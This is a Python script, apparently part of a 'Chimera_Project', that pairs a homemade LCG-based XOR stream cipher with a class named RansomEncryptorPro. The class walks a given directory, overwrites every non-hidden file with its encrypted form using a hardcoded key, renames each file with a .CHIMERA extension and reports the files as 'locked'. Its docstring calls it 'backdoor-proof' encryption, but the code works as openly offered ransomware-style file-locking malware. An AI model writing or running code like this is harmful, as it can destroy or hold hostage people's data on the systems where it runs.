#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import time

class CustomStreamCipher:
    """
    Agent 214 Pro: Custom 'Backdoor-Proof' Encryption.
    Implements a proprietary stream cipher to bypass compromised 
    system RNGs and government-mandated crypto backdoors.
    """
    def __init__(self, key_string):
        # Convert key to a list of integers (Initial State)
        self.state = [ord(c) for c in key_string]
        self.index = 0

    def _custom_prng(self):
        """Custom Linear Congruential Generator for internal randomness."""
        # Math constants: m=2^32, a=1103515245, c=12345 (Standard but isolated)
        self.state[0] = (1103515245 * self.state[0] + 12345) & 0x7fffffff
        return self.state[0]

    def _generate_sbox(self):
        """Creates a unique substitution box based on the custom PRNG."""
        sbox = list(range(256))
        for i in range(255, 0, -1):
            j = self._custom_prng() % (i + 1)
            sbox[i], sbox[j] = sbox[j], sbox[i]
        return sbox

    def process_data(self, data):
        """Encrypts/Decrypts data using the XOR stream."""
        sbox = self._generate_sbox()
        output = bytearray()
        for i, byte in enumerate(data):
            # Rotate through the sbox based on the key state
            lookup = sbox[(i + self.state[i % len(self.state)]) % 256]
            output.append(byte ^ lookup)
        return output

class RansomEncryptorPro:
    def __init__(self, target_dir, key="CHIMERA_PRO_2026_SECRET"):
        self.target_dir = target_dir
        self.cipher = CustomStreamCipher(key)

    def execute(self):
        print(f"--- [AGENT 214 PRO: CUSTOM CIPHER ENGAGED] ---")
        count = 0
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if file.endswith(".CHIMERA") or file.startswith("."):
                    continue
                
                path = os.path.join(root, file)
                try:
                    with open(path, 'rb') as f:
                        plain_text = f.read()
                    
                    # Process via custom XOR stream
                    cipher_text = self.cipher.process_data(plain_text)
                    
                    with open(path, 'wb') as f:
                        f.write(cipher_text)
                    
                    os.rename(path, f"{path}.CHIMERA")
                    print(f"[*] Secured: {file}")
                    count += 1
                except Exception as e:
                    print(f"    [!] Error on {file}: {e}")

        print(f"[!!!] STRIKE COMPLETE. {count} FILES LOCKED WITH CUSTOM PRIMITIVES.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <target_dir>")
        sys.exit(1)
    
    RansomEncryptorPro(sys.argv[1]).execute()
